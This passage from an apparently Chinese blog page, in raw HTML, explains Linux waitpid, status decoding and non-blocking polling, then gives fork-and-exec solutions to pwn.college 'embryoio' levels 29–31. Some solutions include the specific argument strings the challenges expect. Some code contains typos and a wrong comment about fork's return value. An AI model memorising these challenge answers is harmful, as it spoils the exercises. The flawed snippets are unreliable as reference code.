class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">               </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="3-2-waitpid-函数"><a href="#3-2-waitpid-函数" class="headerlink" title="3.2 waitpid 函数"></a>3.2 waitpid 函数</h4><blockquote><p>pid_ t waitpid(pid_t pid, int *status, int options);<br>返回值：<br>当正常返回的时候waitpid返回收集到的子进程的进程ID；<br>如果设置了选项WNOHANG,而调用中waitpid发现没有已退出的子进程可收集,则返回0；<br>如果调用中出错,则返回-1,这时errno会被设置成相应的值以指示错误所在；<br>参数：<br>pid：<br>Pid&#x3D;-1,等待任一个子进程。与wait等效。<br>Pid&gt;0.等待其进程ID与pid相等的子进程。<br>status:<br>WIFEXITED(status): 若为正常终止子进程返回的状态，则为真。（查看进程是否是正常退出）<br>WEXITSTATUS(status): 若WIFEXITED非零，提取子进程退出码。（查看进程的退出码）<br>options:<br>参数为0:也就是阻塞版本的等待，也就是说该waitpid在子进程没有退出情况下就不会返回，就和wait的使用一模一样，因为wait的使用就是阻塞版本的等待方式；<br>参数为WNOHANG: 这是一个宏，表示调用wait为非阻塞的版本，非阻塞也就以为执行带waitpid函数会立即返回；<br>而设置这个参数：返回情况有以下几种：</p><p>若pid指定的子进程没有结束，则waitpid()函数返回0，父进程不予以等待；<br>若正常结束，则返回该子进程的ID；<br>若等待失败，即返回小于0；</p></blockquote><p><strong>第一层理解</strong>：</p><p><strong>对于 waitpid 函数就是 wait函数的增强版；</strong></p><p><strong>waitpid 函数 的使用方式 waitpid(-1,NULL,0) 等价 wait 函数的使用 wait(NULL) 两者这样使用一样的；</strong></p><p>第二层理解：</p><ol><li>对于status参数，其实是一个输出型参数，也就是父进程调用该waitpid时候，可以传入一个 地址给 status；待该waitpid执行结束返回时候，会得到该staus的值；</li><li>status的值表示子进程的退出码的信息，也就是父进程为了得到子进程的退出信息，就是可以通过设置一个参数传入给status,获得子进程的信息；</li><li>status的退出信息：也就是子进程退出的信息，而进程退出只有三种状态：正常退出执行代码结果正确，异常退出，正常退出了但是执行的结果不正确；异常退出的进程：本质是因为收到了某种信号，才会异常退出，而对于正常退出的进程，才有退出码而言说法；不管是信号还是退出码，都是子进程需要返回给父进程中stauts参数的；</li><li>其次这个 stauts，父进程获得子进程的status；不可以简简单单的认为 stauts就是一个整形int,我们要把它为一个位图；对于32位的int类型来说：我们status是在每一个位上设置它的信息来使用的；高16位不使用，而低16位使用来表示具体信息；</li></ol><p><strong>3.2.1获得子进程的status信息</strong></p><p><img src="https://pic1.zhimg.com/80/v2-9e127b4563b39e18812e4de577b055b4_720w.webp" alt="img"></p><p><strong>也就是说：对于子进程退出的状态信息：在8-16位的表示退出码的信息，低7位表示终止信号信息；而第8位单独一个表示core dump 状态，我们暂时不关系这个信息；</strong></p><p><strong>那么我们是如何获得该子进程的退出的信息的呢？</strong></p><p>我们可以通过</p><p>（stauts &gt;&gt; 8 ）&amp; 0xFF；获得子进程的退出码；</p><p>stauts &amp; 0x7F; 获得子进程的终止信号；</p><p><strong>代码验证一下：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;    </span><br><span class="line">#include&lt;string.h&gt;                                                                                             </span><br><span class="line">#include&lt;stdlib.h&gt;    </span><br><span class="line">#include&lt;unistd.h&gt;    </span><br><span class="line">#include&lt;sys/wait.h&gt;    </span><br><span class="line">    </span><br><span class="line">int main()    </span><br><span class="line">&#123;    </span><br><span class="line">  pid_t pid = fork();    </span><br><span class="line">    </span><br><span class="line">  if(pid == 0)&#123;    </span><br><span class="line">    //child    </span><br><span class="line">    printf(&quot;i am a process my pid  = %d\n&quot;,getpid());    </span><br><span class="line">    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    </span><br><span class="line">  &#125;    </span><br><span class="line">  //parent process    </span><br><span class="line">  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    </span><br><span class="line">  pid_t ret = waitpid(pid,&amp;status,0);//传入status的地址，获得子进程的退出的信息    </span><br><span class="line">  if(ret == -1)&#123;    </span><br><span class="line">    perror(&quot;wait failed\n&quot;);    </span><br><span class="line">  &#125;    </span><br><span class="line">  //waitpid 等待成功    </span><br><span class="line">  //打印子进程的stauts退出码信息和终止信号信息，这是在父进获取到子进程的信息    </span><br><span class="line">  printf(&quot;waitpid 返回的stauts 的退出码信息：%d,终止信号的信息：%d\n&quot;,(status&gt;&gt;8)&amp;0xFF,status&amp;0x7F);    </span><br><span class="line">  return 0;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-27ac8692e925a9c72a887aba3ec1110c_720w.webp" alt="img"></p><p>这里我并没演示退出时候异常退出的情况，也就是我没有演示发送信号给子进程会有什么样的状态：</p><p>其实就是在另一个窗口给子该进程发送一个信号值，当进程退出时候，这个信号就会被返回到父进程的stauts中，这样就能获取了；</p><p>当然异常的情况还有内存越界，什么段错误，什么除0操作，一旦程序出现这些状态，也可以在父进程waitpid中的参数status中获取得到，我就不演示了；感兴趣可以试一试；</p><p>我们获得子进程的退出码，其实可以不用通过：位操作的(status &gt;&gt; 8 )&amp; 0xFF获取，</p><p>在我们的C程序中提供一个宏：</p><p>WIFEXITED(status): 若为正常终止子进程返回的状态，则为真；</p><p>那么我们就可以通过if判断该条件是否真假，获得子进程的退出码：</p><p>获得的方式为这个宏WEXITSTATUS(status): 若WIFEXITED非零，提取子进程退出码。</p><p><strong>测试子进程正常退出，获取它的状态码：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;    </span><br><span class="line">#include&lt;string.h&gt;                                                                                             </span><br><span class="line">#include&lt;stdlib.h&gt;    </span><br><span class="line">#include&lt;unistd.h&gt;    </span><br><span class="line">#include&lt;sys/wait.h&gt;        </span><br><span class="line">int main()    </span><br><span class="line">&#123;    </span><br><span class="line">  pid_t pid = fork();    </span><br><span class="line">    </span><br><span class="line">  if(pid == 0)&#123;    </span><br><span class="line">    //child    </span><br><span class="line">    printf(&quot;i am a process my pid  = %d\n&quot;,getpid());    </span><br><span class="line">    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    </span><br><span class="line">  &#125;    </span><br><span class="line">  //parent process    </span><br><span class="line">  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    </span><br><span class="line">  pid_t ret = waitpid(pid,&amp;status,0);//传入status的地址，获得子进程的退出的信息    </span><br><span class="line">  if(ret == -1)&#123;    </span><br><span class="line">    perror(&quot;wait failed\n&quot;);    </span><br><span class="line">  &#125;    </span><br><span class="line">  //waitpid 等待成功</span><br><span class="line">    if(WIFEXITED(status))&#123;    </span><br><span class="line">    printf(&quot;子进程pid = %d 正常退出，父进程获得子进程的退出码为：%d\n&quot;,pid,WEXITSTATUS(status));    </span><br><span class="line">  &#125;    </span><br><span class="line">  else&#123;    </span><br><span class="line">    printf(&quot;WIFEXITED为假，子进程异常退出，非正常退出\n&quot;);                                                       </span><br><span class="line">  &#125;       </span><br><span class="line">  return 0;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码的结果：</p><p><img src="https://pic1.zhimg.com/80/v2-f67e1854daa8000633b57ea54e603e78_720w.webp" alt="img"></p><p>假如子进程异常退出，那么就会执行else分支语句，不会获得退出码；</p><h4 id="3-2-2-理解下waitpid内部是如何返回status的"><a href="#3-2-2-理解下waitpid内部是如何返回status的" class="headerlink" title="3.2.2 理解下waitpid内部是如何返回status的"></a>3.2.2 理解下waitpid内部是如何返回status的</h4><p>我们知道：当我们创建进程时候，在内核是有该进程的PCB的，而PCB里面存放着我们进程退出的信息；</p><p>也就是有退出码和终止信号，在用户层父进程调用waitpid函数时候，该函数进入内核会给把我们的子进程的PCB退出码和终止信号信息给status赋值；</p><p>也就是大概类似这样的操作：</p><p><img src="https://pic3.zhimg.com/80/v2-44c9bca831a4e1569fb460023f1eaffa_720w.webp" alt="img"></p><h4 id="3-2-3-waitpid-的options参数的理解"><a href="#3-2-3-waitpid-的options参数的理解" class="headerlink" title="3.2.3 waitpid 的options参数的理解"></a>3.2.3 waitpid 的options参数的理解</h4><p><strong>该参数设置：一般设置为WNOHANG：表示为父进程是以非阻塞的方式等待子进程；</strong></p><p>但是非阻塞方式等待子进程退出就有几种情况：</p><blockquote><p>&gt; 1.子进程没有退出，但是父进程调用的waitpid返回了0，这也表示等待子进程成功，只不过子进程没有退出，此时表示需要继续做父进程的事情；<br>\2. 子进程退出了，f父进程调用waitpid函数返回子进程的PID， 也就是等待成功了，这时候我们在父进程可以拿到子进程的退出状态信息；<br>\3. waitpid等待子进程退出失败，waitpid就会返回小于0的值，此时就可以做一些输出错误信息给用户；</p></blockquote><p><strong>阻塞本质就是：调用该函数的父进程由在运行队列被放入到了等待队列中等待，同时修改进程状态为S；</strong></p><p><strong>waitpid返回的本质也就是：将该父进程从等待队列拿到运行队列中执行；</strong></p><p>测试options：<strong>WNODHANG</strong></p><p>非阻塞等待子进程；</p><p>一般而言<strong>我们会使用一种叫做非阻塞轮回检测技术来检测子进程的退出状态</strong>，也就是说：我希望子进程退出能够被我父进程检测到，同时我又不希望我父进程处于阻塞等待，也就是父进程不希望自己什么事都不可以做，只等子进程退出返回；</p><p>如何做到呢？</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;    </span><br><span class="line">#include&lt;string.h&gt;    </span><br><span class="line">#include&lt;stdlib.h&gt;    </span><br><span class="line">#include&lt;unistd.h&gt;    </span><br><span class="line">#include&lt;sys/wait.h&gt;    </span><br><span class="line">    </span><br><span class="line">int main()    </span><br><span class="line">&#123;                                                                                                                                        </span><br><span class="line">  pid_t pid = fork();    </span><br><span class="line">    </span><br><span class="line">  if(pid == 0)&#123;    </span><br><span class="line">    //child    </span><br><span class="line">    int count = 10;    </span><br><span class="line">    while(count)&#123;    </span><br><span class="line">    printf(&quot;i am a process my pid  = %d\n&quot;,getpid());    </span><br><span class="line">    count --;    </span><br><span class="line">    sleep(1);    </span><br><span class="line">    &#125;    </span><br><span class="line">    exit(11); //退出子进程，我们在父进程调用waitpid来获得子进程的退出码信息    </span><br><span class="line">  &#125;    </span><br><span class="line">  //parent process    </span><br><span class="line">  int status; //该变量是父进程的变量，为的是在父进程获得子进程的退出状态的信息    </span><br><span class="line">    </span><br><span class="line">  while(1)&#123; //这个循环就是继续轮回检测的非阻塞版本的设计，假如子进程没退出，我们一直死循环检测知道直到它退出    </span><br><span class="line">  pid_t ret = waitpid(pid,&amp;status,WNOHANG);//WNOHANG:表示父进程非阻塞方式等待子进程退出    </span><br><span class="line">  if(ret==0)&#123;    </span><br><span class="line">    //ret == 0 表示waitpid等待成功，但是子进程还没有退出，waitpid返回0回到父进程的代码执行    </span><br><span class="line">    //做父进程的事情；</span><br><span class="line">        printf(&quot;我waitpid返回0，等待子进程成功，但是子进程没有退出，我可做父进程要做的事\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else if(ret &gt; 0)&#123;</span><br><span class="line">     //waitpid 等待成功,子进程退出，父进程就可以获取子进程的信息</span><br><span class="line">    printf(&quot;waitpid 返回的stauts 的退出码信息：%d,终止信号的信息：%d\n&quot;,(status&gt;&gt;8)&amp;0xFF,status&amp;0x7F);</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    printf(&quot;waitpid is failed\n&quot;);</span><br><span class="line">    break;</span><br><span class="line">  &#125;  </span><br><span class="line">  sleep(1); //让父进程每隔一秒去检测</span><br><span class="line">&#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pic2.zhimg.com/80/v2-921b0d0364ee075fe8977ec8e9edd65d_720w.webp" alt="img"></p><h4 id="根目录是”-x2F-“当前用户的目录是”-”"><a href="#根目录是”-x2F-“当前用户的目录是”-”" class="headerlink" title="根目录是”&#x2F;“当前用户的目录是”~”"></a><strong>根目录是”&#x2F;“当前用户的目录是”~”</strong></h4><h3 id="Level②⑨"><a href="#Level②⑨" class="headerlink" title="Level②⑨"></a>Level②⑨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *args[]=&#123;<span class="string">&quot;/challenge/embryoio_level29&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;/challenge/embryoio_level29&quot;</span>,args);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pwn.college&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> stat;</span><br><span class="line">    <span class="type">int</span> childPid;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span> (fork()==<span class="number">0</span>)&#123;</span><br><span class="line">childPid=getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>,childPid);</span><br><span class="line">        pwncollege();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok,i am child ,iwll leave\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>,getpid());</span><br><span class="line">        waitpid(childPid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok,i am father, i will leave\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下看出来的知识点：</p><ol><li>对父进程的检测需要使用exec()系列的函数，因为system()或popen()函数都会执行一个shell，然后用shell来执行，所以此时父进程为shell（测试后是dash），而不是你的程序。</li><li>而exec()只是替换掉正在exec()的进程，当用fork()函数时子进程调用exec()系列函数杀死自己的子进程副本的时候就会建立与当前主进程的父子关系。</li><li>当一个父亲创建了一个孩子但没有等它结束就自己结束的话就可能造成系统异常，查询waitpid()的使用来等待孩子进程。</li></ol><p>另外查询了一下，说是exec系统调用，实际上在Linux中，并不存在一个exec()的函数形式，exec指的是一组函数，一共有6个，分别是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg, ..., <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>然后整理了一下基本使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level29&quot;</span>,argv,env);<span class="comment">//使用exec系列函数执行时不会改变新进程的父亲，相当于只是将当前进&gt;程替换掉了</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> fpid;</span><br><span class="line"></span><br><span class="line">    fpid=fork();<span class="comment">//fork()执行之后，会复制一个基本一样的进程作为子进程，然后两个进程会分别执行后面的代码</span></span><br><span class="line">    <span class="keyword">if</span>(fpid&lt;<span class="number">0</span>)<span class="comment">//如果fpid为-1，说明fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid==<span class="number">0</span>)&#123;<span class="comment">//成功则会出现两个进程，fpid==0的是子进程</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是子进程\n&quot;</span>);</span><br><span class="line">            pwncollege(argv,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//fpid==1的是父进程</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是父进程\n&quot;</span>);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又是一次轮回。</p><p>注意，设定参数数组时，第一个不是参数而是文件名，而且最后需要加NULL（因为数组最后一位需要为\0吧。），这两个任意错了一步就会导致运行子进程失败：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">(<span class="type">char</span>* argv[],<span class="type">char</span> *env[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[]=&#123;<span class="string">&quot;embryoio_level31&quot;</span>,<span class="string">&quot;scfxabffgf&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/challenge/embryoio_level31&quot;</span>,newargv,env);<span class="comment">//使用exec系列函数执行时不会改变新进程的父亲，相当于只是将当前&gt;进程替换掉了</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> fpid;</span><br><span class="line"></span><br><span class="line">    fpid=fork();<span class="comment">//fork()执行之后，会复制一个基本一样的进程作为子进程，然后两个进程会分别执行后面的代码</span></span><br><span class="line">    <span class="keyword">if</span>(fpid&lt;<span class="number">0</span>)<span class="comment">//如果fpid为-1，说明fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid==<span class="number">0</span>)&#123;<span class="comment">//成功则会出现两个进程，fpid==0的是子进程</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是子进程\n&quot;</span>);</span><br><span class="line">            pwncollege(argv,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//fpid==1的是父进程</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;我是父进程\n&quot;</span>);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Level③O"><a href="#Level③O" class="headerlink" title="Level③O"></a>Level③O</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwncollege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> argv[]=&#123;<span class="string">&quot;/challenge/embryoio_level30&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* file=<span class="string">&quot;/challenge/embrhyoio_level30&quot;</span></span><br><span class="line">    execvp(file,argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pwn.college&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv[],<span class="type">char</span>* env[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> stat;</span><br><span class="line">    <span class="type">int</span> childPid;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span> (fork()==<span class="number">0</span>)&#123;</span><br><span class="line">childPid=getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child pid is %d\n&quot;</span>,childPid);</span><br><span class="line">        pwncollege();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok,i am child ,iwll leave\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent pid is %d\n&quot;</span>,getpid());</span><br><span class="line">        waitpid(childPid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok,i am father, i will leave\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>slibtmfk</p><h3 id="Level③①"><a href="#Level③①" class="headerlink" title="Level③①"></a>Level③①</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">void pwncollege()&#123;</span><br><span class="line">        char* const argv[]=&#123;<span class="string">&quot;/challenge/embryoio_level31&quot;</span>,<span class="string">&quot;niibxwjmor&quot;</span>,NULL&#125;;</span><br><span class="line">    const char* file=<span class="string">&quot;/challenge/embryoio_level31&quot;</span>;</span><br><span class="line">    execvp(file,argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc,char** argv[],char* env[])&#123;</span><br><span class="line">    <span class="built_in">int</span> childPid;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    <span class="keyword">if</span> (fork()==<span class="number">0</span>)&#123;</span><br><span class="line">    